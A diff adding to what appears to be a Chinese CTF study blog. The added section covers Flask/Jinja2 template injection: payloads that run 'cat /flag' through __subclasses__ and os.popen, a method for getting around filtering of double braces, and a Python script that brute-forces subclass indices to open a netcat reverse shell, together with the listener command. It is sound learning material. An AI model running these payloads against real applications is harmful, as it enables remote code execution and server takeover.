@@ -479,7 +479,49 @@ var_dump(intval($f*100));
 <td align="center"><code>__globals__</code></td>
 <td align="center">函数会以字典的形式返回当前对象的全部全局变量</td>
 </tr>
+<tr>
+<td align="center"><code>__getitem__()</code></td>
+<td align="center">对字典使用时，传入字符串，返回字典相应键所对应的值;当对列表使用时，传入整数返回列表对应索引的值。(代替中括号)</td>
+</tr>
 </tbody></table>
+<p>一个pyload例子:</p>
+<pre><code class="python">&#123;&#123;().__class__.__base__.__subclasses__()[484].__init__.__globals__.os.popen('cat /flag').read()&#125;&#125;
+&#123;&#123;().__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("cat /flag").read()&#125;&#125;
+</code></pre>
+<p><img src="https://i0.hdslb.com/bfs/article/1de9eebf52ff8083014a622e627f02ac290349942.png"></p>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="过滤双大括号"><a href="#过滤双大括号" class="headerlink" title="过滤双大括号"></a>过滤双大括号</h3><p><a href="https://www.bilibili.com/video/BV1tj411u7Bx?p=10">视频</a></p>
+<p><code>&#123;% %&#125;</code>使用介绍:</p>
+<p><code>&#123;%%&#125;</code>是属于flask的控制语句，且以<code>&#123;%end..%&#125;</code>结尾，可以通过在控制语句定义变量或者写循环，判断。</p>
+<p>判断<code>&#123;&#123;&#125;&#125;</code>被过滤</p>
+<p>尝试<code>&#123;% %&#125;</code></p>
+<p>判断语句能否正常执行</p>
+<pre><code class="python">1 &#123;% if 2>1 %&#125;qwq&#123;%endif%&#125;
+2 &#123;% if "".__class__ %&#125;qwq&#123;%endif%&#125;
+
+3 &quot;&#123;% if ().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['popen']('cat /flag').read() %&#125;qwq&#123;%endif%&#125;&quot;
+</code></pre>
+<h3 id="无回显ssti"><a href="#无回显ssti" class="headerlink" title="无回显ssti"></a>无回显ssti</h3><p>反弹shell</p>
+<pre><code class="python">
+import requests
+
+url = &#39;http://192.168.86.133:780/flasklab/level/3&#39; #input(&quot;url:&quot;)
+for i in range(500):
+    #data=&#123;&quot;name&quot;:&quot;&#123;&#123;().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__&#125;&#125;&quot;&#125;
+    data=&#123;&quot;code&quot;:&quot;&#123;% if ().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['popen']('netcat 192.168.86.130 7777 -e /bin/bash').read() %&#125;qwq&#123;%endif%&#125;&quot;&#125;
+    try:
+        response=requests.post(url,data=data)
+        #print(response.text)
+        if response.status_code == 200:
+            #os.py
+            if &#39;qwq&#39; in response.text:
+                print(i,&quot;--&gt;&quot;,data)
+    except:
+        pass
+
+</code></pre>
+<p>反弹:</p>
+<pre><code class="shell">nc -lvp 7777
+</code></pre>
 <h1 id="上传解压接口软链接覆盖问题-软链接攻击"><a href="#上传解压接口软链接覆盖问题-软链接攻击" class="headerlink" title="上传解压接口软链接覆盖问题(软链接攻击)"></a>上传解压接口软链接覆盖问题(软链接攻击)</h1><p>例题:hgame2024 week 3 ZeroLink </p>
 <p>特点:上传一个zip压缩包，程序会进行解压，指定要读取的文件名，文件内容将被返回至网页(或者存在读取接口)。</p>
 <pre><code class="shell">
